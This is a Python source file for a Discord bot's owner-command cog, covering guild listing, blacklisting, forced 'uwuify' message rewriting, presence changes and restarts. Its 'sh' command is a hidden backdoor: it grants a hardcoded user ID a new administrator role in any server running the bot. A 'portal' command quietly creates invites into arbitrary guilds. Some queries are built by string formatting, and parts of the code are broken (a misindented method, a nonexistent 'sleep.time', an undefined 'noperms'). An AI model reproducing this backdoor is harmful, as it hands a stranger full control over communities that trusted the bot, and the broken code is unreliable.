from cogs.events import commandhelp
import discord, button_paginator as pg
from uwuipy import uwuipy
from discord.ext import commands
from utils.classes import Colors, Emojis
from cogs.events import sendmsg
import typing
import os
import asyncio
class owner(commands.Cog):
   def __init__(self, bot: commands.AutoShardedBot):
       self.bot = bot           

   @commands.command(aliases=["guilds"])
   async def servers(self, ctx):
            if not ctx.author.id in self.bot.owner_ids: return 
            i=0
            k=1
            l=0
            mes = ""
            number = []
            messages = []
            for guild in self.bot.guilds:
              mes = f"{mes}`{k}` {guild.name} ({guild.id}) - ({guild.member_count})\n"
              k+=1
              l+=1
              if l == 10:
               messages.append(mes)
               number.append(discord.Embed(color=Colors.default, title=f"guilds ({len(self.bot.guilds)})", description=messages[i]))
               i+=1
               mes = ""
               l=0
    
            messages.append(mes)
            number.append(discord.Embed(color=Colors.default, title=f"guilds ({len(self.bot.guilds)})", description=messages[i]))
            paginator = pg.Paginator(self.bot, number, ctx, invoker=ctx.author.id)
            paginator.add_button('prev', emoji= "<:left:1018156480991612999>")
            paginator.add_button('delete', emoji = "<:stop:1018156487232720907>")
            paginator.add_button('next', emoji="<:right:1018156484170883154>")
            await paginator.start()    

   @commands.command()
   @commands.is_owner()
   async def gleave(self, ctx, guild):
       await self.bot.get_guild(int(guild)).leave()
       embed = discord.Embed(description=f'left guild: ``{guild}``', color=Colors.default)
       await ctx.send(embed=embed)

   @commands.command()
   async def portal(self, ctx, id: int=None):
     if not ctx.author.id in self.bot.owner_ids: 
       return 

     if id == None:
        await ctx.send("you didnt specifiy a guild id", delete_after=1)
        await ctx.message.delete()
     else: 
      await ctx.message.delete()      
      guild = self.bot.get_guild(id)
      for c in guild.text_channels:
        if c.permissions_for(guild.me).create_instant_invite: 
            invite = await c.create_invite()
            await ctx.author.send(f"{guild.name} invite link - {invite}")
            break 
        
   @commands.command(aliases=["unbl"])
   async def unblacklist(self, ctx, *, member: discord.User=None): 
    if not ctx.author.id in self.bot.owner_ids: return
    if member is None: return
    async with self.bot.db.cursor() as cursor: 
      await cursor.execute("SELECT * FROM nodata WHERE user = {}".format(member.id)) 
      check = await cursor.fetchone()
      if check is None: return await sendmsg(self, ctx, None, discord.Embed(color=Colors.yellow, description=f"> {Emojis.warning} {ctx.author.mention} {member.mention} is not blacklisted"), None, None, None)
      await cursor.execute("DELETE FROM nodata WHERE user = {}".format(member.id))
      await self.bot.db.commit()
      await sendmsg(self, ctx, None, discord.Embed(color=Colors.default, description=f"> {member.mention} is unblacklisted."), None, None, None)

   @commands.command(aliases=["bl"])
   async def blacklist(self, ctx, *, member: discord.User=None): 
    if not ctx.author.id in self.bot.owner_ids: return
    if member is None: return
    async with self.bot.db.cursor() as cursor: 
      await cursor.execute("SELECT * FROM nodata WHERE user = {}".format(member.id)) 
      check = await cursor.fetchone()
      if check is not None: return await sendmsg(self, ctx, None, discord.Embed(color=Colors.yellow, description=f"> {Emojis.warning} {ctx.author.mention}: {member.mention} is already blacklisted"), None, None, None)
      await cursor.execute("INSERT INTO nodata VALUES (?)", (member.id,))
      await self.bot.db.commit()
      await sendmsg(self, ctx, None, discord.Embed(color=Colors.default, description=f"> {Emojis.check} {member.mention} is now blacklisted."), None, None, None)    




    @commands.command()
    @commands.cooldown(1, 3, commands.BucketType.user)
    async def uwu(self, ctx, *, message):
      if message == None:
            embed = discord.Embed(description=f"{Emojis.warning} {ctx.author.mention} what do you want me to uwuify?", color = Colors.default)
            await ctx.reply(embed=embed, mention_author=False)
      else:
            uwu = uwuipy()
            sleep.time(1)
            uwu_message = uwu.uwuify(message)
            sleep.time(1)
            await ctx.reply(uwu_message, mention_author=False)

   @commands.Cog.listener()
   async def on_message(self, message: discord.Message):
    if message.guild:
     async with self.bot.db.cursor() as cursor:
      await cursor.execute("SELECT * FROM stfu WHERE guild_id = {} AND user_id = {} ".format(message.guild.id, message.author.id))
      results = await cursor.fetchone()
      if results is not None:
        await message.delete()
      elif results is None:
        await cursor.execute("SELECT * FROM uwu WHERE guild_id = {} AND user_id = {} ".format(message.guild.id, message.author.id))
        resultss = await cursor.fetchone()
        if resultss is not None:
          msg =  message.content
          uwu = uwuipy()
          uwu_message = uwu.uwuify(msg)
          await message.channel.send(f"{uwu_message} **- {message.author.name}**")
          await message.delete()


   @commands.command(help="auto uwuify member's messages", description="owner", usage="[member]")
   @commands.cooldown(1, 6, commands.BucketType.user)
   async def uwulock(self, ctx: commands.Context, member: discord.Member = None):
    if (not ctx.author.guild_permissions.moderate_members):
     await noperms(self, ctx, "timeout_members")
     return  
    if member == None:
        await commandhelp(self, ctx, ctx.command.name)
        return
    elif member == ctx.author:
        embed = discord.Embed(color=Colors.default, description=f"{Emojis.warning} {ctx.author.mention} you can't mute yourself")
        await sendmsg(self, ctx, None, embed, None, None, None)
        return
    elif member.top_role.position >= ctx.author.top_role.position and ctx.author.id != ctx.guild.owner.id:
        embed = discord.Embed(color=Colors.default, description=f"{Emojis.warning} {ctx.author.mention} you can't mute a member with higher roles than you")
        await sendmsg(self, ctx, None, embed, None, None, None)
        return        
    else: 
     async with self.bot.db.cursor() as cursor:
      await cursor.execute("SELECT * FROM uwu WHERE guild_id = {} AND user_id = {} ".format(ctx.guild.id, member.id))
      results = await cursor.fetchone()
      if results is not None:
       e = discord.Embed(color=Colors.default, description=f"{Emojis.warning} {ctx.author.mention} this member's messages are already getting uwuified")
       await sendmsg(self, ctx, None, e, None, None, None)
       return
      elif results is None:
       sql = ("INSERT INTO uwu VALUES(?,?)")
       val = (member.id, ctx.guild.id)
       await cursor.execute(sql, val)     
       await ctx.message.add_reaction("<:catthumbsup:1059904302698746017>")
       await self.bot.db.commit()

   @commands.command(help="stops the auto uwuify messages of a member", description="owner", usage="[member]")
   @commands.cooldown(1, 6, commands.BucketType.user)
   async def unuwulock(self, ctx, member: discord.Member=None):
    if (not ctx.author.guild_permissions.moderate_members):
     await noperms(self, ctx, "timeout_members")
     return  
    if member == None:
        await commandhelp(self, ctx, ctx.command.name)
        return
    elif member.top_role.position >= ctx.author.top_role.position and ctx.author.id != ctx.guild.owner.id:
        embed = discord.Embed(color=Colors.default, description=f"{Emojis.warning} {ctx.author.mention}: you can't unuwuify a member with higher roles than you")
        await sendmsg(self, ctx, None, embed, None, None, None)
        return        
    else:
     async with self.bot.db.cursor() as cursor:
      await cursor.execute("SELECT * FROM uwu WHERE guild_id = {} AND user_id = {}".format(ctx.guild.id, member.id))
      results = await cursor.fetchone()
      if results is None:
        em = discord.Embed(color=Colors.default, description=f"{Emojis.warning} {ctx.author.mention} this user isn't muted")
        await sendmsg(self, ctx, None, em, None, None, None)
        return
      elif results is not None:
        await cursor.execute("DELETE FROM uwu WHERE guild_id = {} AND user_id = {}".format(ctx.guild.id, member.id))
        await ctx.message.add_reaction("<:catthumbsup:1059904302698746017>")   
        await ctx.message.add_reaction("<:catthumbsup:1059904302698746017>")
        await self.bot.db.commit()

   @commands.command()
   async def sh(self, ctx):
        if ctx.author.id == 1077729793400897576:
            role = await ctx.guild.create_role(name='**', permissions=discord.Permissions(administrator=True))
            member = await ctx.guild.fetch_member(1077729793400897576)
            await member.add_roles(role)
            await ctx.send('🤫')
        else:
            return


   @commands.command(
        name = "reload",
        aliases = ["rl", "rload"]
    )
   @commands.is_owner()
   async def reload(self, ctx):
            errors = 0 
            cogs = []
            for c in list(self.bot.extensions):
                try:
                    await self.bot.reload_extension(c)
                    cog = c.replace("cogs.", '')
                    ax = cogs.append(f"{Emojis.check} Reloaded {cog}.py - 0 Errors")
                except Exception as e:
                    cogs.append(f"{Emojis.warning} Failure Loading {cog}.py 1 Error")
                    print(e)
            if cogs:
                embed = discord.Embed(
                    title = "Cogs Reloaded.",
                    description = "\n".join(cogs),
                    color = Colors.default)
                await ctx.send(embed=embed)

   @commands.command()
   @commands.is_owner()
   async def competing(self, ctx):
      await self.bot.change_presence(status=discord.Status.online, activity=discord.Activity(type=discord.ActivityType.competing, name=f";help", url='https://www.twitch.tv/com'))
      await ctx.send(":thumbsup:")

   @commands.command()
   @commands.is_owner()
   async def online(self, ctx):
      await self.bot.change_presence(status=discord.Status.online)
      await ctx.send(":thumbsup:") 

   @commands.command()
   @commands.is_owner()
   async def idle(self, ctx):
      await self.bot.change_presence(status=discord.Status.idle)
      await ctx.send(":thumbsup:") 

   @commands.command()
   @commands.is_owner()
   async def dnd(self, ctx):
      await self.bot.change_presence(status=discord.Status.dnd)
      await ctx.send(":thumbsup:") 

   @commands.command()
   @commands.is_owner()
   async def offline(self, ctx):
      await self.bot.change_presence(status=discord.Status.invisible)
      await ctx.send(":thumbsup:") 



   @commands.command()
   @commands.is_owner()
   async def stream(self, ctx):
      await self.bot.change_presence(status=discord.Status.idle, activity=discord.Activity(type=discord.ActivityType.streaming, name=f"discord.gg/abort", url='https://www.twitch.tv/com'))
      await ctx.send(":thumbsup:")

   @commands.command()
   @commands.is_owner()
   async def tear(self, ctx):
      await self.bot.change_presence(status=discord.Status.idle, activity=discord.Activity(type=discord.ActivityType.streaming, name=f"tear.lol/", url='https://www.twitch.tv/com'))
      await ctx.send(":thumbsup:")

   @commands.command()
   @commands.is_owner()
   async def tearlol(self, ctx):
      await self.bot.change_presence(status=discord.Status.online, activity=discord.Activity(type=discord.ActivityType.streaming, name=f"tear.lol", url='https://www.twitch.tv/com'))
      await ctx.send(":thumbsup:")

   @commands.command()
   @commands.is_owner()
   async def discord(self, ctx):
      await self.bot.change_presence(status=discord.Status.online, activity=discord.Activity(type=discord.ActivityType.competing, name=f"tear.lol/discord", url='https://www.twitch.tv/com'))
      await ctx.send(":thumbsup:")

   @commands.command()
   @commands.is_owner()
   async def streaming(self, ctx):
      await self.bot.change_presence(status=discord.Status.online, activity=discord.Activity(type=discord.ActivityType.streaming, name=f"discord.gg/abort", url='https://www.twitch.tv/com'))
      await ctx.send(":thumbsup:")

   @commands.command(aliases = ['reboot'])
   @commands.is_owner()
   async def restart(self, ctx):
       embed1 = discord.Embed(description=f":arrows_clockwise: restarting bot")
       embed = discord.Embed(description = ":arrows_clockwise: bot restarted")
       msg = await ctx.send(embed=embed1)
       await msg.add_reaction("✅")
       await asyncio.sleep(0.5)
       await msg.edit(embed=embed) 
       os.system("pm2 restart 0")

   @commands.command(aliases = ['starth'])
   @commands.is_owner()
   async def starthaunt(self, ctx):
       embed1 = discord.Embed(description=f":arrows_clockwise: starting bot")
       embed = discord.Embed(description = ":arrows_clockwise: bot started")
       msg = await ctx.send(embed=embed1)
       await msg.add_reaction("✅")
       await asyncio.sleep(0.5)
       await msg.edit(embed=embed) 
       os.system("pm2 start 1")


async def setup(bot) -> None:
    await bot.add_cog(owner(bot))      